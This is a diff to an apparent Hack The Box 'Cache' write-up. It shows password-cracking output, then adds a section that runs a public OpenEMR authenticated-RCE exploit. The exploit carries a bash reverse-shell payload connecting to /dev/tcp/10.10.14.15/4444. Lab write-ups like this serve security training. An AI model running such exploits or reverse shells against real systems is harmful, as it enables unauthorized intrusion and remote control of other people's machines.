@@ -216,8 +216,19 @@ xxxxxx           (?)
 1g 0:00:00:00 DONE 2/3 (2020-10-25 22:26) 3.571g/s 4114p/s 4114c/s 4114C/s water..88888888
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
-
 ```
+
+### RCE (OpenEMR)
+
+There was a [POC exploit](https://www.exploit-db.com/exploits/45161) for the authentication RCE for OpenEMR < 5.0.1.
+
+```console
+$ python openemr-rce.py http://hms.htb -u 'openemr_admin' -p 'xxxxxx' -c 'bash -i >& /dev/tcp/10.10.14.15/4444 0>&1'
+```
+
+![image](/assets/img/post/htb/cache/13_rce.png)
+
+![image](/assets/img/post/htb/cache/14_rce-2.png)
 
 
 
